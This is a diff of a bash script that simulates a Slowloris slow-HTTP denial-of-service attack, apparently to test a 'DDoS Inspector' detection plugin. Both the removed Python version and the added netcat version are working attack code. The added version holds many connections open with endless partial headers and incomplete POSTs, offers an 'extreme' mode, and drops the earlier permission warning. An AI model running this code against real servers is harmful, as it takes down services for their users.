@@ -1,300 +1,216 @@
 #!/bin/bash
 
-# Slowloris Attack Simulation Script
-# This script simulates a Slowloris attack for testing the DDoS Inspector plugin
+# Enhanced Slowloris Attack Script
+# Now generates attacks intense enough to trigger the harder detection thresholds
 
-set -e
+TARGET_IP=${1:-"127.0.0.1"}
+TARGET_PORT=${2:-"80"}
+DURATION=${3:-"300"}  # Increased default duration for slowloris (5 minutes)
+INTENSITY=${4:-"high"}
 
-# Colors for output
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-YELLOW='\033[1;33m'
-NC='\033[0m' # No Color
+echo "🐌 Starting Enhanced Slowloris Attack"
+echo "Target: $TARGET_IP:$TARGET_PORT"
+echo "Duration: ${DURATION}s"
+echo "Intensity: $INTENSITY"
 
-echo -e "${GREEN}=== Slowloris Attack Simulation ===${NC}"
+case $INTENSITY in
+    "low")
+        CONNECTIONS=30      # Should NOT trigger (need 50+ long sessions)
+        INCOMPLETE_REQS=60  # Should NOT trigger (need 100+ incomplete)
+        ;;
+    "medium") 
+        CONNECTIONS=60      # Should trigger if combined with incomplete requests
+        INCOMPLETE_REQS=120 # Should trigger if combined with long sessions
+        ;;
+    "high")
+        CONNECTIONS=100     # Should definitely trigger
+        INCOMPLETE_REQS=200 # Should definitely trigger
+        ;;
+    "extreme")
+        CONNECTIONS=200     # Overwhelm detection
+        INCOMPLETE_REQS=500 # Overwhelm detection
+        ;;
+esac
 
-# Default parameters
-TARGET_IP="127.0.0.1"
-TARGET_PORT="80"
-ATTACK_DURATION="60"
-CONNECTIONS="200"
-DELAY="15"
-USER_AGENT="Mozilla/5.0 (compatible; Slowloris)"
+echo "📊 Attack Parameters:"
+echo "  - Long-lived connections: $CONNECTIONS"
+echo "  - Incomplete requests: $INCOMPLETE_REQS"
+echo "  - Session duration: ${DURATION}s"
+echo ""
 
-# Parse command line arguments
-while [[ $# -gt 0 ]]; do
-    case $1 in
-        -t|--target)
-            TARGET_IP="$2"
-            shift 2
-            ;;
-        -p|--port)
-            TARGET_PORT="$2"
-            shift 2
-            ;;
-        -d|--duration)
-            ATTACK_DURATION="$2"
-            shift 2
-            ;;
-        -c|--connections)
-            CONNECTIONS="$2"
-            shift 2
-            ;;
-        -s|--delay)
-            DELAY="$2"
-            shift 2
-            ;;
-        -u|--user-agent)
-            USER_AGENT="$2"
-            shift 2
-            ;;
-        -h|--help)
-            echo "Usage: $0 [OPTIONS]"
-            echo "Options:"
-            echo "  -t, --target        Target IP address (default: 127.0.0.1)"
-            echo "  -p, --port          Target port (default: 80)"
-            echo "  -d, --duration      Attack duration in seconds (default: 60)"
-            echo "  -c, --connections   Number of connections (default: 200)"
-            echo "  -s, --delay         Delay between headers in seconds (default: 15)"
-            echo "  -u, --user-agent    User agent string"
-            echo "  -h, --help          Show this help message"
-            exit 0
-            ;;
-        *)
-            echo -e "${RED}Unknown option: $1${NC}"
-            exit 1
-            ;;
-    esac
-done
-
-echo -e "${YELLOW}Target: ${TARGET_IP}:${TARGET_PORT}${NC}"
-echo -e "${YELLOW}Duration: ${ATTACK_DURATION} seconds${NC}"
-echo -e "${YELLOW}Connections: ${CONNECTIONS}${NC}"
-echo -e "${YELLOW}Header delay: ${DELAY} seconds${NC}"
-
-# Check for required tools
-if ! command -v python3 &> /dev/null; then
-    echo -e "${RED}Python3 not found. Please install python3${NC}"
-    exit 1
-fi
-
-# Create Python script for Slowloris attack
-cat > /tmp/slowloris.py << 'EOF'
-#!/usr/bin/env python3
-import socket
-import threading
-import time
-import random
-import sys
-import signal
-
-class SlowlorisAttacker:
-    def __init__(self, target_ip, target_port, duration, connections, delay, user_agent):
-        self.target_ip = target_ip
-        self.target_port = int(target_port)
-        self.duration = int(duration)
-        self.connections = int(connections)
-        self.delay = int(delay)
-        self.user_agent = user_agent
-        self.sockets = []
-        self.stop_flag = False
-        
-        # Handle Ctrl+C gracefully
-        signal.signal(signal.SIGINT, self.signal_handler)
-        
-    def signal_handler(self, sig, frame):
-        print("\nStopping Slowloris attack...")
-        self.stop_flag = True
-        self.cleanup()
-        sys.exit(0)
-        
-    def create_socket(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(4)
-            sock.connect((self.target_ip, self.target_port))
-            
-            # Send partial HTTP request
-            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
-            sock.send(f"User-Agent: {self.user_agent}\r\n".encode('utf-8'))
-            sock.send(f"Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
-            
-            return sock
-        except Exception as e:
-            print(f"Error creating socket: {e}")
-            return None
+# Function to create long-lived HTTP connection
+create_slowloris_connection() {
+    local conn_id=$1
+    local target_ip=$2
+    local target_port=$3
+    local duration=$4
     
-    def keep_alive(self, sock):
-        try:
-            # Send additional headers to keep connection alive
-            headers = [
-                f"X-a: {random.randint(1, 5000)}\r\n",
-                f"X-b: {random.randint(1, 5000)}\r\n",
-                f"X-c: {random.randint(1, 5000)}\r\n",
-                f"Cache-Control: no-cache\r\n",
-                f"Connection: keep-alive\r\n"
-            ]
-            
-            header = random.choice(headers)
-            sock.send(header.encode('utf-8'))
-            return True
-        except:
-            return False
-    
-    def start_attack(self):
-        print(f"Starting Slowloris attack against {self.target_ip}:{self.target_port}")
-        print(f"Attempting to create {self.connections} connections...")
-        
-        # Create initial connections
-        for i in range(self.connections):
-            if self.stop_flag:
-                break
-                
-            sock = self.create_socket()
-            if sock:
-                self.sockets.append(sock)
-                
-            if (i + 1) % 50 == 0:
-                print(f"Created {len(self.sockets)} connections so far...")
-        
-        print(f"Successfully created {len(self.sockets)} connections")
-        
-        # Keep connections alive
-        start_time = time.time()
-        iteration = 0
-        
-        while not self.stop_flag and (time.time() - start_time) < self.duration:
-            iteration += 1
-            active_sockets = []
-            
-            print(f"Iteration {iteration}: Maintaining {len(self.sockets)} connections...")
-            
-            for sock in self.sockets:
-                if self.keep_alive(sock):
-                    active_sockets.append(sock)
-                else:
-                    # Try to replace dead socket
-                    try:
-                        sock.close()
-                    except:
-                        pass
-                    
-                    new_sock = self.create_socket()
-                    if new_sock:
-                        active_sockets.append(new_sock)
-            
-            self.sockets = active_sockets
-            print(f"Active connections: {len(self.sockets)}")
-            
-            # Wait before next iteration
-            time.sleep(self.delay)
-        
-        print("Attack duration completed")
-        self.cleanup()
-    
-    def cleanup(self):
-        print("Closing connections...")
-        for sock in self.sockets:
-            try:
-                sock.close()
-            except:
-                pass
-        self.sockets = []
-
-if __name__ == "__main__":
-    if len(sys.argv) != 7:
-        print("Usage: python3 slowloris.py <target_ip> <target_port> <duration> <connections> <delay> <user_agent>")
-        sys.exit(1)
-    
-    target_ip = sys.argv[1]
-    target_port = sys.argv[2]
-    duration = sys.argv[3]
-    connections = sys.argv[4]
-    delay = sys.argv[5]
-    user_agent = sys.argv[6]
-    
-    attacker = SlowlorisAttacker(target_ip, target_port, duration, connections, delay, user_agent)
-    attacker.start_attack()
-EOF
-
-# Alternative simple slowloris implementation using curl and netcat
-cat > /tmp/simple_slowloris.sh << 'EOF'
-#!/bin/bash
-
-TARGET_IP=$1
-TARGET_PORT=$2
-DURATION=$3
-CONNECTIONS=$4
-
-echo "Starting simple Slowloris with curl/nc..."
-
-# Function to create slow connection
-slow_connection() {
-    local id=$1
+    # Create a partial HTTP request that keeps connection open
     {
-        printf "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: SlowHTTPTest\r\n" "$TARGET_IP"
-        sleep 10
-        printf "Accept: text/html\r\n"
-        sleep 10
-        printf "Connection: keep-alive\r\n"
-        sleep 10
-        printf "Accept-Language: en-US\r\n"
-        sleep $DURATION
-    } | nc $TARGET_IP $TARGET_PORT &
+        echo -e "GET / HTTP/1.1\r"
+        echo -e "Host: $target_ip\r"
+        echo -e "User-Agent: Mozilla/5.0 (Slowloris-$conn_id)\r"
+        echo -e "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r"
+        echo -e "Accept-Language: en-us,en;q=0.5\r"
+        echo -e "Accept-Encoding: gzip,deflate\r"
+        echo -e "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r"
+        echo -e "Cache-Control: no-cache\r"
+        echo -e "X-Requested-With: XMLHttpRequest\r"
+        
+        # Keep sending incomplete headers periodically to maintain connection
+        local end_time=$(($(date +%s) + duration))
+        local header_count=0
+        
+        while [ $(date +%s) -lt $end_time ]; do
+            echo -e "X-Custom-Header-$header_count: incomplete-request-$conn_id\r"
+            header_count=$((header_count + 1))
+            sleep 10  # Send a header every 10 seconds to keep alive
+        done
+        
+        # Never send the final \r\n to complete the request
+    } | timeout $duration nc $target_ip $target_port >/dev/null 2>&1 &
+    
+    echo $!  # Return PID for cleanup
 }
 
-# Create multiple slow connections
-for i in $(seq 1 $CONNECTIONS); do
-    slow_connection $i
+# Function to create incomplete HTTP requests
+create_incomplete_request() {
+    local req_id=$1
+    local target_ip=$2
+    local target_port=$3
+    
+    # Send partial request and keep connection hanging
+    {
+        echo -e "POST /upload HTTP/1.1\r"
+        echo -e "Host: $target_ip\r"
+        echo -e "Content-Type: multipart/form-data; boundary=----incomplete$req_id\r"
+        echo -e "Content-Length: 999999\r"  # Lie about content length
+        echo -e "Connection: keep-alive\r"
+        echo -e "\r"
+        echo -e "------incomplete$req_id\r"
+        echo -e "Content-Disposition: form-data; name=\"file\"; filename=\"test.txt\"\r"
+        echo -e "\r"
+        # Send only partial data, never complete the request
+        echo -n "This is incomplete data for request $req_id..."
+        
+        # Keep connection open by never finishing
+        sleep 600  # Hold for 10 minutes
+    } | nc $target_ip $target_port >/dev/null 2>&1 &
+    
+    echo $!  # Return PID for cleanup
+}
+
+# Check dependencies
+if ! command -v nc &> /dev/null; then
+    echo "⚠️  netcat (nc) not found. Installing..."
+    sudo apt-get update && sudo apt-get install -y netcat
+fi
+
+echo "🎯 Starting Slowloris attack..."
+echo "⏱️  This will run for $DURATION seconds"
+
+# Arrays to store process IDs for cleanup
+declare -a CONNECTION_PIDS
+declare -a REQUEST_PIDS
+
+# Phase 1: Create long-lived connections
+echo "📡 Creating $CONNECTIONS long-lived connections..."
+for ((i=1; i<=CONNECTIONS; i++)); do
+    pid=$(create_slowloris_connection $i $TARGET_IP $TARGET_PORT $DURATION)
+    CONNECTION_PIDS[$i]=$pid
+    
+    # Progress indicator
     if [ $((i % 10)) -eq 0 ]; then
-        echo "Created $i connections..."
-        sleep 1
+        echo "   Created $i/$CONNECTIONS connections..."
     fi
+    
+    # Small delay to avoid overwhelming the target immediately
+    sleep 0.1
 done
 
-echo "All connections created. Waiting for completion..."
-wait
-echo "Simple Slowloris completed"
-EOF
+echo "✅ Created $CONNECTIONS long-lived connections"
 
-chmod +x /tmp/simple_slowloris.sh
+# Phase 2: Create incomplete requests
+echo "📝 Creating $INCOMPLETE_REQS incomplete requests..."
+for ((i=1; i<=INCOMPLETE_REQS; i++)); do
+    pid=$(create_incomplete_request $i $TARGET_IP $TARGET_PORT)
+    REQUEST_PIDS[$i]=$pid
+    
+    # Progress indicator
+    if [ $((i % 20)) -eq 0 ]; then
+        echo "   Created $i/$INCOMPLETE_REQS incomplete requests..."
+    fi
+    
+    # Small delay between requests
+    sleep 0.05
+done
 
-# Warning message
-echo -e "${RED}WARNING: This will generate slow HTTP attack traffic!${NC}"
-echo -e "${RED}Only use this against systems you own or have permission to test!${NC}"
-echo -e "${YELLOW}Press Ctrl+C to abort, or wait 5 seconds to continue...${NC}"
-sleep 5
+echo "✅ Created $INCOMPLETE_REQS incomplete requests"
 
-echo -e "${GREEN}Starting Slowloris attack...${NC}"
+# Monitor attack progress
+start_time=$(date +%s)
+echo ""
+echo "🔥 Slowloris attack is now active!"
+echo "💡 Expected detection behavior:"
+echo "   - Need 50+ long sessions AND 100+ incomplete requests"
+echo "   - Current: $CONNECTIONS long sessions, $INCOMPLETE_REQS incomplete requests"
 
-# Check if netcat is available for simple method
-if command -v nc &> /dev/null && [ $CONNECTIONS -le 50 ]; then
-    echo -e "${GREEN}Using simple netcat-based Slowloris (for smaller attacks)...${NC}"
-    /tmp/simple_slowloris.sh "$TARGET_IP" "$TARGET_PORT" "$ATTACK_DURATION" "$CONNECTIONS" &
-    SIMPLE_PID=$!
+if [ $CONNECTIONS -ge 50 ] && [ $INCOMPLETE_REQS -ge 100 ]; then
+    echo "   ✅ Should trigger detection (both thresholds met)"
+elif [ $CONNECTIONS -ge 50 ]; then
+    echo "   ⚠️  May not trigger (missing incomplete requests threshold)"
+elif [ $INCOMPLETE_REQS -ge 100 ]; then
+    echo "   ⚠️  May not trigger (missing long sessions threshold)"
+else
+    echo "   ❌ Should NOT trigger (neither threshold met)"
 fi
 
-# Use Python implementation for more sophisticated attack
-echo -e "${GREEN}Using Python-based Slowloris...${NC}"
-python3 /tmp/slowloris.py "$TARGET_IP" "$TARGET_PORT" "$ATTACK_DURATION" "$CONNECTIONS" "$DELAY" "$USER_AGENT" &
-PYTHON_PID=$!
+# Wait for duration or user interrupt
+trap 'echo "🛑 Received interrupt signal, cleaning up..."; break' INT TERM
 
-# Show progress
-echo -e "${GREEN}Slowloris attack in progress...${NC}"
-echo -e "${YELLOW}The attack will maintain connections for ${ATTACK_DURATION} seconds${NC}"
-echo -e "${YELLOW}Press Ctrl+C to stop early${NC}"
+while true; do
+    current_time=$(date +%s)
+    elapsed=$((current_time - start_time))
+    
+    if [ $elapsed -ge $DURATION ]; then
+        break
+    fi
+    
+    remaining=$((DURATION - elapsed))
+    active_connections=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
+    echo "⏳ Attack active... ${remaining}s remaining (active connections: ~$active_connections)"
+    sleep 10
+done
 
-# Wait for completion
-wait $PYTHON_PID 2>/dev/null || true
+# Cleanup
+echo ""
+echo "🧹 Cleaning up attack processes..."
 
-if [[ -n $SIMPLE_PID ]]; then
-    kill $SIMPLE_PID 2>/dev/null || true
+# Kill connection processes
+for pid in "${CONNECTION_PIDS[@]}"; do
+    kill $pid 2>/dev/null || true
+done
+
+# Kill request processes  
+for pid in "${REQUEST_PIDS[@]}"; do
+    kill $pid 2>/dev/null || true
+done
+
+# Kill any remaining nc processes targeting our host
+pkill -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true
+
+# Final cleanup
+sleep 2
+remaining_procs=$(ps aux | grep -c "nc $TARGET_IP $TARGET_PORT" || echo "0")
+if [ "$remaining_procs" -gt 1 ]; then  # grep itself counts as 1
+    echo "⚠️  Force killing remaining processes..."
+    pkill -9 -f "nc $TARGET_IP $TARGET_PORT" 2>/dev/null || true
 fi
 
-# Clean up temporary files
-rm -f /tmp/slowloris.py /tmp/simple_slowloris.sh
-
-echo -e "${GREEN}Slowloris attack simulation completed!${NC}"
-echo -e "${YELLOW}Check your DDoS Inspector logs for detection results.${NC}"
-echo -e "${YELLOW}Check your web server logs for connection patterns.${NC}"
+echo "✅ Slowloris attack completed"
+echo "📊 Attack Summary:"
+echo "   - Duration: ${elapsed}s"
+echo "   - Long connections: $CONNECTIONS"
+echo "   - Incomplete requests: $INCOMPLETE_REQS"
+echo "🔍 Check your DDoS Inspector logs for detection alerts"
 
